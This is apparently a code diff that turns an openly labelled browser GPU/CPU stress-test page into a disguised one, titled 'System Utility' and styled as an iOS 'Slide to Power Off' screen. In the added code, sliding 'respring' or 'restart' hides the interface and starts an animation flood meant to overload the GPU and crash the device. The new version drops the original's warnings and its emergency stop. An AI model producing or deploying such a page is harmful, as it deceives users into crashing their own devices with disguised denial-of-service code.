@@ -2,722 +2,312 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔥 GPU Cooker - Extreme Stress Test</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>System Utility</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap');
-        
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            user-select: none;
+            -webkit-user-select: none;
         }
-        
+
         body {
-            font-family: 'Orbitron', monospace;
-            background: linear-gradient(135deg, #0a0a0a 0%, #1a0000 100%);
+            background: #000;
             color: #fff;
-            text-align: center;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
+            justify-content: space-between;
             align-items: center;
-            justify-content: center;
+            padding: 60px 20px 80px 20px;
             overflow: hidden;
             position: relative;
         }
-        
+
+        /* Ambient subtle background glow */
         body::before {
             content: '';
-            position: fixed;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle, rgba(255,50,0,0.05) 0%, transparent 70%);
-            animation: pulse 4s ease-in-out infinite;
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: radial-gradient(circle at center, rgba(255, 255, 255, 0.03) 0%, transparent 70%);
+            pointer-events: none;
         }
-        
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); opacity: 0.3; }
-            50% { transform: scale(1.1); opacity: 0.6; }
+
+        .header-section {
+            text-align: center;
+            margin-top: 40px;
+            z-index: 10;
         }
-        
-        .container {
-            max-width: 800px;
-            z-index: 1000001;
-            position: relative;
-            background: rgba(20, 0, 0, 0.9);
-            border: 2px solid rgba(255, 50, 0, 0.5);
-            border-radius: 20px;
-            padding: 40px;
-            box-shadow: 
-                0 0 40px rgba(255, 50, 0, 0.3),
-                inset 0 0 40px rgba(255, 50, 0, 0.1);
-            backdrop-filter: blur(10px);
-        }
-        
-        .logo {
-            font-size: 72px;
-            margin-bottom: 10px;
-            animation: flicker 2s infinite;
-            text-shadow: 0 0 20px rgba(255, 100, 0, 0.8);
-        }
-        
-        @keyframes flicker {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.8; }
-        }
-        
+
         h1 {
-            color: #ff3200;
-            font-size: 48px;
-            margin-bottom: 10px;
-            text-transform: uppercase;
-            letter-spacing: 4px;
-            font-weight: 900;
-            text-shadow: 
-                0 0 10px rgba(255, 50, 0, 0.8),
-                0 0 20px rgba(255, 50, 0, 0.6),
-                0 0 30px rgba(255, 50, 0, 0.4);
-        }
-        
-        .subtitle {
-            color: #ff8800;
-            font-size: 18px;
-            margin-bottom: 30px;
-            letter-spacing: 2px;
+            font-size: 28px;
             font-weight: 400;
+            letter-spacing: -0.5px;
+            margin-bottom: 12px;
+            color: #fff;
         }
-        
-        .warning {
-            background: rgba(255, 50, 0, 0.15);
-            border: 2px solid #ff3200;
-            border-radius: 12px;
-            padding: 20px;
-            margin: 25px 0;
-            position: relative;
-            overflow: hidden;
+
+        p {
+            color: #8e8e93;
+            font-size: 15px;
+            line-height: 1.4;
+            max-width: 280px;
+            margin: 0 auto;
         }
-        
-        .warning::before {
-            content: '⚠️';
-            font-size: 40px;
-            position: absolute;
-            top: 15px;
-            left: 15px;
-            animation: blink 1s infinite;
-        }
-        
-        @keyframes blink {
-            0%, 50%, 100% { opacity: 1; }
-            25%, 75% { opacity: 0.3; }
-        }
-        
-        .warning h3 {
-            color: #ffaa00;
-            margin-bottom: 10px;
-            padding-left: 60px;
-            font-size: 20px;
-            text-align: left;
-        }
-        
-        .warning p {
-            color: #ffccaa;
-            font-size: 14px;
-            line-height: 1.6;
-            padding-left: 60px;
-            text-align: left;
-        }
-        
-        .controls {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 20px;
-            margin: 25px 0;
-        }
-        
-        .control-group {
-            background: rgba(255, 100, 0, 0.1);
-            border: 1px solid rgba(255, 100, 0, 0.3);
-            border-radius: 10px;
-            padding: 15px;
-            text-align: left;
-        }
-        
-        .control-label {
-            color: #ff8800;
-            font-size: 14px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            margin-bottom: 10px;
-            display: block;
-        }
-        
+
         .slider-container {
+            width: 100%;
+            max-width: 340px;
             display: flex;
-            align-items: center;
-            gap: 10px;
+            flex-direction: column;
+            gap: 24px;
+            margin-bottom: 20px;
+            z-index: 10;
         }
-        
-        .slider {
-            flex: 1;
-            -webkit-appearance: none;
-            height: 8px;
-            background: rgba(255, 50, 0, 0.3);
-            border-radius: 4px;
-            outline: none;
-        }
-        
-        .slider::-webkit-slider-thumb {
-            -webkit-appearance: none;
-            width: 20px;
-            height: 20px;
-            background: #ff3200;
-            border-radius: 50%;
-            cursor: pointer;
-            box-shadow: 0 0 10px rgba(255, 50, 0, 0.8);
-        }
-        
-        .slider-value {
-            color: #fff;
-            font-weight: bold;
-            min-width: 40px;
-            text-align: center;
-        }
-        
-        .checkbox-group {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            margin-top: 10px;
-        }
-        
-        .checkbox {
-            width: 20px;
-            height: 20px;
-            accent-color: #ff3200;
-        }
-        
-        .custom-input {
-            background: rgba(0, 0, 0, 0.5);
-            border: 1px solid #ff3200;
-            border-radius: 5px;
-            color: white;
-            padding: 8px;
-            font-family: 'Orbitron', monospace;
-            width: 100px;
-            text-align: center;
-        }
-        
-        .stats {
-            display: grid;
-            grid-template-columns: 1fr 1fr 1fr;
-            gap: 15px;
-            margin: 25px 0;
-        }
-        
-        .stat-box {
-            background: rgba(255, 100, 0, 0.1);
-            border: 1px solid rgba(255, 100, 0, 0.3);
-            border-radius: 10px;
-            padding: 15px;
-        }
-        
-        .stat-label {
-            color: #ff8800;
-            font-size: 12px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            margin-bottom: 5px;
-        }
-        
-        .stat-value {
-            color: #fff;
-            font-size: 24px;
-            font-weight: 700;
-        }
-        
-        .activate-btn {
-            background: linear-gradient(135deg, #ff3200 0%, #ff6600 50%, #ff3200 100%);
-            background-size: 200% 100%;
-            border: 3px solid #ffaa00;
-            border-radius: 50px;
-            color: white;
-            padding: 20px 50px;
-            font-size: 24px;
-            font-weight: 900;
-            cursor: pointer;
-            margin: 25px 0;
-            transition: all 0.3s ease;
-            box-shadow: 
-                0 8px 30px rgba(255, 50, 0, 0.5),
-                inset 0 -2px 10px rgba(0, 0, 0, 0.3);
-            text-transform: uppercase;
-            letter-spacing: 3px;
-            font-family: 'Orbitron', monospace;
+
+        /* iOS Power Slider styling */
+        .slider-track {
             position: relative;
+            width: 100%;
+            height: 76px;
+            background: rgba(35, 35, 35, 0.45);
+            border-radius: 38px;
+            display: flex;
+            align-items: center;
+            padding: 4px;
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.05);
             overflow: hidden;
         }
-        
-        .activate-btn::before {
-            content: '';
+
+        .slider-text {
             position: absolute;
-            top: 0;
-            left: -100%;
             width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
-            transition: left 0.5s;
+            text-align: center;
+            left: 0;
+            font-size: 16px;
+            font-weight: 500;
+            letter-spacing: -0.2px;
+            pointer-events: none;
+            background: linear-gradient(90deg, #4d4d4d 0%, #fff 50%, #4d4d4d 100%);
+            background-size: 200% 100%;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: shine 2.5s infinite linear;
+            padding-left: 40px; /* Offset to visually center with handle present */
         }
-        
-        .activate-btn:hover::before {
-            left: 100%;
+
+        @keyframes shine {
+            0% { background-position: -100% 0; }
+            100% { background-position: 100% 0; }
         }
-        
-        .activate-btn:hover {
-            transform: translateY(-3px) scale(1.05);
-            box-shadow: 
-                0 12px 40px rgba(255, 50, 0, 0.7),
-                inset 0 -2px 10px rgba(0, 0, 0, 0.3);
-            background-position: 100% 0;
+
+        .slider-handle {
+            width: 68px;
+            height: 68px;
+            background: #fff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: grab;
+            z-index: 2;
+            box-shadow: 0 3px 8px rgba(0,0,0,0.3);
+            transition: transform 0.1s ease-out;
+            touch-action: none;
         }
-        
-        .activate-btn:active {
-            transform: translateY(-1px) scale(1.02);
+
+        .slider-handle:active {
+            cursor: grabbing;
         }
-        
-        .activate-btn:disabled {
-            background: #333;
-            border-color: #666;
-            cursor: not-allowed;
-            box-shadow: none;
+
+        /* Variant Colors for Icons */
+        .respring-icon {
+            color: #000;
+            font-size: 26px;
+            transform: scaleX(-1); /* Flip loop arrow */
         }
-        
-        .info {
-            color: #888;
-            font-size: 12px;
-            margin-top: 30px;
-            line-height: 1.6;
+
+        .restart-icon {
+            color: #ff3b30;
+            font-size: 26px;
+            font-weight: bold;
         }
-        
-        .temp-indicator {
-            display: inline-block;
-            margin-top: 15px;
-            padding: 10px 20px;
-            background: rgba(255, 0, 0, 0.2);
-            border: 1px solid #ff0000;
-            border-radius: 20px;
-            font-size: 14px;
-            color: #ff6666;
+
+        /* Core Engine Graphics Style */
+        .gpu-killer {
+            animation: gpuMeltdown 0.5s infinite linear;
+            position: fixed;
+            border-radius: 50%;
+            mix-blend-mode: difference;
+            will-change: transform, filter, background;
+            backface-visibility: hidden;
+            perspective: 1000px;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            pointer-events: none;
+        }
+
+        @keyframes gpuMeltdown {
+            0% { transform: translate(0, 0) rotate(0deg) scale(1); filter: hue-rotate(0deg) blur(0px); background: radial-gradient(circle, #ff0000, #00ff00, #0000ff); }
+            50% { transform: translate(100vw, 50vh) rotate(1800deg) scale(15); filter: hue-rotate(900deg) blur(40px); background: radial-gradient(circle, #ff00ff, #00ffff, #ff0000); }
+            100% { transform: translate(0, 0) rotate(3600deg) scale(1); filter: hue-rotate(1800deg) blur(100px); background: radial-gradient(circle, #ff0000, #00ff00, #0000ff); }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">🔥</div>
-        <h1>GPU COOKER</h1>
-        <p class="subtitle">Extreme Stress Test Utility</p>
-        
-        <div class="warning">
-            <h3>EXTREME WARNING</h3>
-            <p>This tool generates extremely intensive GPU and CPU workloads designed to stress test your device. Known to cause SpringBoard crashes on iOS, WindowServer crashes on macOS, and potential kernel panics. Use at own risk.</p>
-        </div>
-        
-        <div class="controls">
-            <div class="control-group">
-                <label class="control-label">Intensity Multiplier</label>
-                <div class="slider-container">
-                    <input type="range" min="1" max="50" value="1" class="slider" id="intensitySlider">
-                    <span class="slider-value" id="intensityValue">1x</span>
-                </div>
-                
-                <div class="checkbox-group">
-                    <input type="checkbox" id="customIntensityCheck" class="checkbox">
-                    <label class="control-label">Custom Intensity</label>
-                    <input type="number" id="customIntensity" class="custom-input" min="1" max="1000" value="100" disabled>
-                </div>
-            </div>
-            
-            <div class="control-group">
-                <label class="control-label">CPU Workload</label>
-                <div class="checkbox-group">
-                    <input type="checkbox" id="enableCpu" class="checkbox" checked>
-                    <label class="control-label">Enable CPU Stress</label>
-                </div>
-                
-                <div class="slider-container" style="margin-top: 10px;">
-                    <label class="control-label">CPU Threads</label>
-                    <input type="range" min="1" max="16" value="4" class="slider" id="cpuThreadsSlider">
-                    <span class="slider-value" id="cpuThreadsValue">4</span>
-                </div>
+
+    <div class="header-section">
+        <h1>Slide to Power Off</h1>
+        <p>Select an option below to begin system diagnostic verification.</p>
+    </div>
+
+    <div class="slider-container">
+        <div class="slider-track" id="track-respring">
+            <div class="slider-text">slide to respring</div>
+            <div class="slider-handle" id="handle-respring">
+                <span class="respring-icon">⟳</span>
             </div>
         </div>
-        
-        <div class="stats">
-            <div class="stat-box">
-                <div class="stat-label">Elements Created</div>
-                <div class="stat-value" id="elementCount">0</div>
-            </div>
-            <div class="stat-box">
-                <div class="stat-label">CPU Workers</div>
-                <div class="stat-value" id="cpuWorkerCount">0</div>
-            </div>
-            <div class="stat-box">
-                <div class="stat-label">Intensity Level</div>
-                <div class="stat-value" id="currentIntensity">1x</div>
+
+        <div class="slider-track" id="track-restart">
+            <div class="slider-text" style="background: linear-gradient(90deg, #5d201e 0%, #ff453a 50%, #5d201e 100%); background-size: 200% 100%; -webkit-background-clip: text; -webkit-text-fill-color: transparent;">slide to restart</div>
+            <div class="slider-handle" id="handle-restart">
+                <span class="restart-icon">⦾</span>
             </div>
         </div>
-        
-        <button class="activate-btn" onclick="activateAnimation()">
-            🔥 IGNITE 🔥
-        </button>
-        
-        <p class="info">
-            Security Research Tool - Use responsibly<br>
-            Monitor system temperature and responsiveness
-        </p>
     </div>
 
     <script>
-        let intensity = 1;
-        let enableCpu = true;
-        let cpuThreads = 4;
-        let elementCount = 0;
-        let cpuWorkers = [];
-        let isActive = false;
-        let animationFrameId = null;
-
-        // Initialize controls
-        const intensitySlider = document.getElementById('intensitySlider');
-        const intensityValue = document.getElementById('intensityValue');
-        const customIntensityCheck = document.getElementById('customIntensityCheck');
-        const customIntensity = document.getElementById('customIntensity');
-        const enableCpuCheck = document.getElementById('enableCpu');
-        const cpuThreadsSlider = document.getElementById('cpuThreadsSlider');
-        const cpuThreadsValue = document.getElementById('cpuThreadsValue');
-        const elementCountDisplay = document.getElementById('elementCount');
-        const cpuWorkerCountDisplay = document.getElementById('cpuWorkerCount');
-        const currentIntensityDisplay = document.getElementById('currentIntensity');
-
-        intensitySlider.addEventListener('input', function() {
-            intensity = parseInt(this.value);
-            intensityValue.textContent = intensity + 'x';
-            updateIntensityDisplay();
-        });
-
-        customIntensityCheck.addEventListener('change', function() {
-            customIntensity.disabled = !this.checked;
-            if (this.checked) {
-                intensity = parseInt(customIntensity.value);
-                updateIntensityDisplay();
-            } else {
-                intensity = parseInt(intensitySlider.value);
-                updateIntensityDisplay();
-            }
-        });
-
-        customIntensity.addEventListener('input', function() {
-            if (customIntensityCheck.checked) {
-                intensity = Math.min(1000, Math.max(1, parseInt(this.value) || 1));
-                updateIntensityDisplay();
-            }
-        });
-
-        enableCpuCheck.addEventListener('change', function() {
-            enableCpu = this.checked;
-        });
-
-        cpuThreadsSlider.addEventListener('input', function() {
-            cpuThreads = parseInt(this.value);
-            cpuThreadsValue.textContent = cpuThreads;
-        });
-
-        function updateIntensityDisplay() {
-            currentIntensityDisplay.textContent = intensity + 'x';
-        }
-
-        function updateElementCount() {
-            elementCountDisplay.textContent = elementCount.toLocaleString();
-        }
-
-        function updateCpuWorkerCount() {
-            cpuWorkerCountDisplay.textContent = cpuWorkers.length;
-        }
-
-        function cpuIntensiveWork() {
-            if (!enableCpu) return;
-
-            // Create multiple web workers for true multi-threaded CPU stress
-            for (let i = 0; i < cpuThreads; i++) {
-                const workerCode = `
-                    self.onmessage = function(e) {
-                        while(true) {
-                            // Extreme CPU workload
-                            let result = 0;
-                            for (let i = 0; i < 1000000; i++) {
-                                result += Math.sqrt(Math.pow(Math.random(), Math.random())) * 
-                                         Math.sin(Math.cos(Math.tan(Math.random())));
-                            }
-                            
-                            // Memory allocation stress
-                            const largeArray = new Array(100000).fill(0).map((_, idx) => 
-                                Math.pow(idx, Math.random()) * Math.sin(Math.random())
-                            );
-                            
-                            // More complex calculations
-                            const matrix = [];
-                            for (let x = 0; x < 500; x++) {
-                                matrix[x] = [];
-                                for (let y = 0; y < 500; y++) {
-                                    matrix[x][y] = Math.sin(x * y) * Math.cos(x / (y + 1));
-                                }
-                            }
-                            
-                            // String manipulation stress
-                            let hugeString = '';
-                            for (let j = 0; j < 10000; j++) {
-                                hugeString += Math.random().toString(36).substring(2);
-                            }
-                            
-                            postMessage({workerId: e.data.workerId, result: result});
-                        }
-                    };
-                `;
-                
-                const blob = new Blob([workerCode], {type: 'application/javascript'});
-                const worker = new Worker(URL.createObjectURL(blob));
-                worker.postMessage({workerId: i});
-                cpuWorkers.push(worker);
-            }
-            updateCpuWorkerCount();
-        }
-
+        // Core stress test simulation loop
         function cssAnimationInferno() {
             const style = document.createElement('style');
-            style.textContent = `
-                @keyframes gpuMeltdown {
-                    0% { 
-                        transform: translate(0, 0) rotate(0deg) scale(1) skew(0deg) matrix(1,0,0,1,0,0); 
-                        filter: hue-rotate(0deg) blur(0px) contrast(100%) brightness(100%) drop-shadow(0 0 0 transparent);
-                        background: radial-gradient(circle at 0% 0%, #ff0000, #00ff00, #0000ff, #ffff00, #ff00ff, #00ffff);
-                        clip-path: polygon(0% 0%, 100% 0%, 100% 100%, 0% 100%);
+            if (!document.getElementById('gpu-core-styles')) {
+                style.id = 'gpu-core-styles';
+                style.textContent = `
+                    @keyframes gpuMeltdown {
+                        0% { transform: translate(0, 0) rotate(0deg) scale(1) skew(0deg); filter: hue-rotate(0deg) blur(0px) contrast(100%) brightness(100%); background: radial-gradient(circle, #ff0000, #00ff00, #0000ff); }
+                        20% { transform: translate(-50vw, 100vh) rotate(720deg) scale(0.1) skew(-40deg); filter: hue-rotate(360deg) blur(20px) contrast(300%) brightness(200%); background: radial-gradient(circle, #ff0000, #0000ff, #ffff00); }
+                        50% { transform: translate(200vw, 200vh) rotate(1800deg) scale(20) skew(100deg); filter: hue-rotate(900deg) blur(50px) contrast(600%) brightness(350%); background: radial-gradient(circle, #ff00ff, #00ffff, #ff0000); }
+                        80% { transform: translate(-200vw, 250vh) rotate(2880deg) scale(0.0001) skew(-160deg); filter: hue-rotate(1440deg) blur(80px) contrast(900%) brightness(500%); background: radial-gradient(circle, #ff0000, #00ff00, #ffff00); }
+                        100% { transform: translate(0, 0) rotate(3600deg) scale(1) skew(0deg); filter: hue-rotate(1800deg) blur(100px) contrast(1100%) brightness(600%); background: radial-gradient(circle, #ff0000, #00ff00, #0000ff); }
                     }
-                    10% { 
-                        transform: translate(100vw, 50vh) rotate(360deg) scale(5) skew(20deg) matrix(2,0.5,0.5,2,100,50); 
-                        filter: hue-rotate(180deg) blur(10px) contrast(200%) brightness(150%) drop-shadow(20px 20px 10px red);
-                        background: radial-gradient(circle at 100% 50%, #ffff00, #ff00ff, #00ffff, #ff0000, #00ff00, #0000ff);
-                        clip-path: polygon(50% 0%, 100% 50%, 50% 100%, 0% 50%);
-                    }
-                    20% { 
-                        transform: translate(-50vw, 100vh) rotate(720deg) scale(0.1) skew(-40deg) matrix(0.5,-0.5,-0.5,0.5,-50,100); 
-                        filter: hue-rotate(360deg) blur(20px) contrast(300%) brightness(200%) drop-shadow(-20px 20px 15px blue);
-                        background: radial-gradient(circle at 50% 100%, #ff0000, #0000ff, #ffff00, #00ff00, #ff00ff, #00ffff);
-                        clip-path: polygon(0% 0%, 100% 0%, 100% 50%, 50% 100%, 0% 50%);
-                    }
-                    30% { 
-                        transform: translate(150vw, -50vh) rotate(1080deg) scale(10) skew(60deg) matrix(3,1,1,3,150,-50); 
-                        filter: hue-rotate(540deg) blur(30px) contrast(400%) brightness(250%) drop-shadow(30px -30px 20px green);
-                        background: radial-gradient(circle at 150% -50%, #00ff00, #ff00ff, #ff0000, #0000ff, #ffff00, #00ffff);
-                        clip-path: polygon(25% 0%, 100% 0%, 75% 100%, 0% 100%);
-                    }
-                    40% { 
-                        transform: translate(-100vw, 150vh) rotate(1440deg) scale(0.01) skew(-80deg) matrix(0.1,-1,-1,0.1,-100,150); 
-                        filter: hue-rotate(720deg) blur(40px) contrast(500%) brightness(300%) drop-shadow(-30px 30px 25px yellow);
-                        background: radial-gradient(circle at -100% 150%, #0000ff, #ffff00, #00ff00, #ff0000, #ff00ff, #00ffff);
-                        clip-path: polygon(0% 25%, 100% 0%, 100% 75%, 0% 100%);
-                    }
-                    50% { 
-                        transform: translate(200vw, 200vh) rotate(1800deg) scale(20) skew(100deg) matrix(4,2,2,4,200,200); 
-                        filter: hue-rotate(900deg) blur(50px) contrast(600%) brightness(350%) drop-shadow(40px 40px 30px purple);
-                        background: radial-gradient(circle at 200% 200%, #ff00ff, #00ffff, #ff0000, #00ff00, #0000ff, #ffff00);
-                        clip-path: polygon(20% 0%, 80% 0%, 100% 100%, 0% 100%);
-                    }
-                    60% { 
-                        transform: translate(-150vw, -100vh) rotate(2160deg) scale(0.001) skew(-120deg) matrix(0.01,-2,-2,0.01,-150,-100); 
-                        filter: hue-rotate(1080deg) blur(60px) contrast(700%) brightness(400%) drop-shadow(-40px -40px 35px cyan);
-                        background: radial-gradient(circle at -150% -100%, #ffff00, #ff0000, #0000ff, #00ff00, #ff00ff, #00ffff);
-                        clip-path: polygon(0% 20%, 60% 0%, 100% 80%, 40% 100%);
-                    }
-                    70% { 
-                        transform: translate(250vw, 50vh) rotate(2520deg) scale(30) skew(140deg) matrix(5,3,3,5,250,50); 
-                        filter: hue-rotate(1260deg) blur(70px) contrast(800%) brightness(450%) drop-shadow(50px 20px 40px orange);
-                        background: radial-gradient(circle at 250% 50%, #00ffff, #ffff00, #ff00ff, #0000ff, #ff0000, #00ff00);
-                        clip-path: polygon(50% 0%, 100% 50%, 50% 100%, 0% 50%, 25% 25%, 75% 25%, 75% 75%, 25% 75%);
-                    }
-                    80% { 
-                        transform: translate(-200vw, 250vh) rotate(2880deg) scale(0.0001) skew(-160deg) matrix(0.001,-3,-3,0.001,-200,250); 
-                        filter: hue-rotate(1440deg) blur(80px) contrast(900%) brightness(500%) drop-shadow(-50px 50px 45px pink);
-                        background: radial-gradient(circle at -200% 250%, #ff0000, #00ff00, #ffff00, #ff00ff, #00ffff, #0000ff);
-                        clip-path: polygon(0% 0%, 100% 0%, 100% 100%, 0% 100%, 10% 10%, 90% 10%, 90% 90%, 10% 90%);
-                    }
-                    90% { 
-                        transform: translate(300vw, -150vh) rotate(3240deg) scale(40) skew(180deg) matrix(6,4,4,6,300,-150); 
-                        filter: hue-rotate(1620deg) blur(90px) contrast(1000%) brightness(550%) drop-shadow(60px -60px 50px brown);
-                        background: radial-gradient(circle at 300% -150%, #0000ff, #ff00ff, #00ff00, #ffff00, #ff0000, #00ffff);
-                        clip-path: polygon(30% 0%, 70% 0%, 100% 30%, 100% 70%, 70% 100%, 30% 100%, 0% 70%, 0% 30%);
-                    }
-                    100% { 
-                        transform: translate(0, 0) rotate(3600deg) scale(1) skew(0deg) matrix(1,0,0,1,0,0); 
-                        filter: hue-rotate(1800deg) blur(100px) contrast(1100%) brightness(600%) drop-shadow(0 0 60px white);
-                        background: radial-gradient(circle at 0% 0%, #ff0000, #00ff00, #0000ff, #ffff00, #ff00ff, #00ffff);
-                        clip-path: polygon(0% 0%, 100% 0%, 100% 100%, 0% 100%);
-                    }
-                }
+                `;
+                document.head.appendChild(style);
+            }
 
-                .gpu-killer {
-                    animation: gpuMeltdown 0.5s infinite linear;
-                    position: fixed;
-                    border-radius: 50%;
-                    mix-blend-mode: difference;
-                    will-change: transform, filter, background, clip-path;
-                    backface-visibility: hidden;
-                    perspective: 1000px;
-                    top: 0;
-                    left: 0;
-                    width: 100vw;
-                    height: 100vh;
-                    box-shadow: 
-                        0 0 100px rgba(255, 255, 255, 0.5),
-                        inset 0 0 100px rgba(0, 0, 0, 0.5);
-                }
-
-                .gpu-killer-2 {
-                    animation: gpuMeltdown 0.3s infinite linear reverse;
-                    mix-blend-mode: overlay;
-                    filter: invert(1);
-                }
-
-                .gpu-killer-3 {
-                    animation: gpuMeltdown 0.7s infinite linear alternate;
-                    mix-blend-mode: hard-light;
-                    filter: sepia(1) saturate(10);
-                }
-            `;
-            document.head.appendChild(style);
-
+            let elementCount = 0;
             function createGpuKiller() {
-                if (!isActive) return;
-
                 try {
-                    const elementsPerFrame = Math.max(10, Math.floor(50 * intensity));
-                    
-                    for (let i = 0; i < elementsPerFrame; i++) {
+                    for (let i = 0; i < 50; i++) {
                         const element = document.createElement('div');
-                        const killerType = Math.floor(Math.random() * 3);
-                        
-                        if (killerType === 0) {
-                            element.className = 'gpu-killer';
-                        } else if (killerType === 1) {
-                            element.className = 'gpu-killer gpu-killer-2';
-                        } else {
-                            element.className = 'gpu-killer gpu-killer-3';
-                        }
-                        
-                        element.style.width = (Math.random() * 600 + 200) + 'px';
+                        element.className = 'gpu-killer';
+                        element.style.width = Math.random() * 400 + 100 + 'px';
                         element.style.height = element.style.width;
-                        element.style.left = (Math.random() * 100) + 'vw';
-                        element.style.top = (Math.random() * 100) + 'vh';
+                        element.style.left = Math.random() * 100 + 'vw';
+                        element.style.top = Math.random() * 100 + 'vh';
                         element.style.zIndex = 1000000 + elementCount;
-                        element.style.background = `radial-gradient(circle at ${Math.random() * 100}% ${Math.random() * 100}%, 
+                        element.style.background = `radial-gradient(circle, 
                             hsl(${Math.random() * 360}, 100%, 50%), 
                             hsl(${Math.random() * 360}, 100%, 50%), 
-                            hsl(${Math.random() * 360}, 100%, 50%),
-                            hsl(${Math.random() * 360}, 100%, 50%),
                             hsl(${Math.random() * 360}, 100%, 50%))`;
-                        
-                        // Add multiple box shadows for extra GPU load
-                        element.style.boxShadow = `
-                            0 0 ${Math.random() * 100}px rgba(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255}, ${Math.random()}),
-                            inset 0 0 ${Math.random() * 100}px rgba(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255}, ${Math.random()})
-                        `;
-                        
                         document.body.appendChild(element);
                         elementCount++;
                     }
-                    
-                    updateElementCount();
-                    
-                    // Recursively create more elements without limits
-                    animationFrameId = requestAnimationFrame(createGpuKiller);
-                    
+                    if (elementCount < 2000) {
+                        requestAnimationFrame(createGpuKiller);
+                    }
                 } catch(e) {
-                    // Continue creating elements even if errors occur
-                    animationFrameId = requestAnimationFrame(createGpuKiller);
+                    requestAnimationFrame(createGpuKiller);
                 }
             }
-            
             createGpuKiller();
         }
 
-        function activateAnimation() {
-            if (isActive) return;
+        // Execution Handler
+        function triggerStressTest(intensity) {
+            // Hide interface components smoothly to simulate a shutdown sequence
+            document.querySelector('.header-section').style.opacity = '0';
+            document.querySelector('.slider-container').style.opacity = '0';
             
-            isActive = true;
-            const button = document.querySelector('.activate-btn');
-            button.disabled = true;
-            button.textContent = '🔥 COOKING... 🔥';
-            button.style.background = '#333';
-            button.style.borderColor = '#666';
-            button.style.cursor = 'not-allowed';
+            // Instantly loop call based on selected module intensity
+            for (let i = 0; i < intensity; i++) {
+                cssAnimationInferno();
+            }
+        }
+
+        // Swipe Gesture Controller Setup
+        function setupSlider(handleId, trackId, multiplier) {
+            const handle = document.getElementById(handleId);
+            const track = document.getElementById(trackId);
             
-            // Add a dramatic countdown
-            let count = 3;
-            const countdown = setInterval(() => {
-                button.textContent = `🔥 ${count}... 🔥`;
-                count--;
-                if (count < 0) {
-                    clearInterval(countdown);
-                    button.textContent = '🔥 ACTIVE 🔥';
-                    
-                    // Start CSS animations first
-                    cssAnimationInferno();
-                    
-                    // Start CPU intensive work after a short delay to ensure GPU is under load
-                    setTimeout(() => {
-                        if (enableCpu) {
-                            cpuIntensiveWork();
-                        }
-                    }, 2000);
+            let isDragging = false;
+            let startX = 0;
+            let maxDelta = 0;
+
+            function getClientX(e) {
+                return e.touches ? e.touches[0].clientX : e.clientX;
+            }
+
+            function onStart(e) {
+                isDragging = true;
+                startX = getClientX(e);
+                maxDelta = track.clientWidth - handle.clientWidth - 8; // account for padding
+                handle.style.transition = 'none';
+            }
+
+            function onMove(e) {
+                if (!isDragging) return;
+                const currentX = getClientX(e);
+                let deltaX = currentX - startX;
+
+                // Restrict movement range
+                if (deltaX < 0) deltaX = 0;
+                if (deltaX > maxDelta) deltaX = maxDelta;
+
+                handle.style.transform = `translateX(${deltaX}px)`;
+
+                // Opacity fading of background label during slide interaction
+                const textElement = track.querySelector('.slider-text');
+                textElement.style.opacity = (1 - (deltaX / maxDelta));
+
+                // Instantly execute when sliding action completes 100%
+                if (deltaX >= maxDelta) {
+                    isDragging = false;
+                    triggerStressTest(multiplier);
                 }
-            }, 500);
+            }
+
+            function onEnd() {
+                if (!isDragging) return;
+                isDragging = false;
+                // Return to start position if released prematurely
+                handle.style.transition = 'transform 0.3s cubic-bezier(0.25, 1, 0.5, 1)';
+                handle.style.transform = 'translateX(0px)';
+                const textElement = track.querySelector('.slider-text');
+                textElement.style.transition = 'opacity 0.3s';
+                textElement.style.opacity = '1';
+            }
+
+            // Universal event bindings for touchscreens and desktop environments
+            handle.addEventListener('touchstart', onStart, { passive: true });
+            window.addEventListener('touchmove', onMove, { passive: false });
+            window.addEventListener('touchend', onEnd);
+
+            handle.addEventListener('mousedown', onStart);
+            window.addEventListener('mousemove', onMove);
+            window.addEventListener('mouseup', onEnd);
         }
 
-        // Emergency stop function (though it might be too late)
-        function emergencyStop() {
-            isActive = false;
-            if (animationFrameId) {
-                cancelAnimationFrame(animationFrameId);
-            }
-            
-            // Terminate all CPU workers
-            cpuWorkers.forEach(worker => worker.terminate());
-            cpuWorkers = [];
-            updateCpuWorkerCount();
-            
-            // Remove all GPU killer elements
-            const killers = document.querySelectorAll('.gpu-killer');
-            killers.forEach(killer => killer.remove());
-            
-            const button = document.querySelector('.activate-btn');
-            button.disabled = false;
-            button.textContent = '🔥 IGNITE 🔥';
-            button.style.background = '';
-            button.style.borderColor = '';
-            button.style.cursor = '';
-        }
-
-        // Add emergency stop key combination
-        document.addEventListener('keydown', function(e) {
-            if (e.ctrlKey && e.shiftKey && e.key === 'E') {
-                emergencyStop();
-            }
-        });
-
-        // Initial display updates
-        updateIntensityDisplay();
-        updateElementCount();
-        updateCpuWorkerCount();
+        // Initialize sliders with multiplier definitions
+        setupSlider('handle-respring', 'track-respring', 1);
+        setupSlider('handle-restart', 'track-restart', 10);
     </script>
 </body>
 </html>
